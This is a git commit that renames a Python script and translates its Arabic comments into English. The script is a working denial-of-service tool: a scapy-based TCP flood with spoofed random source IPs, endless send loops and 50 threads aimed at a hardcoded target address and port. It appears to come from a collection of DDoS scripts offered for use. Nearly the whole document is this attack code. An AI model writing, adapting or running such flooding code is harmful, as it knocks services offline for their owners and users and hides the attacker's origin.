875a1c0dfeaa72ba0e2a944c84856be9d6fe509a
Yusuf Husayn <yusufmohammadhussein@gmail.com>
2026-07-03 01:20:28 +0300

    Update and rename scripts/Scripts_For_DDoS/python/00-TCP_Data-Flood.py to scripts/python/00-TCP_Data-Flood.py

--- scripts/python/00-TCP_Data-Flood.py
+++ scripts/python/00-TCP_Data-Flood.py
@@ -1,18 +1,18 @@
 from scapy.all import *
 import random
-import threading # تم إضافة الاستيراد هنا
+import threading # Import added here
 
 def ddos_attack(target_ip, target_port):
     while True:
         src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-        # استخدام sendp للتعامل مع طبقة الـ Ethernet
+        # Using sendp to handle the Ethernet layer
         packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=target_ip) / TCP(dport=target_port) / "Hello, World!"
-        sendp(packet, verbose=False) # تم تغييرها إلى sendp
+        sendp(packet, verbose=False) # It has been changed to sendp
 
-# استخدام السكربت
+# Using the script
 target_ip = "192.168.1.25"
 target_port = 80
 for _ in range(50):
-    # تم تصحيح اسم الدالة هنا لتطابق ddos_attack
+    # The function name has been corrected here to match ddos ​​attack
     t = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
     t.start()
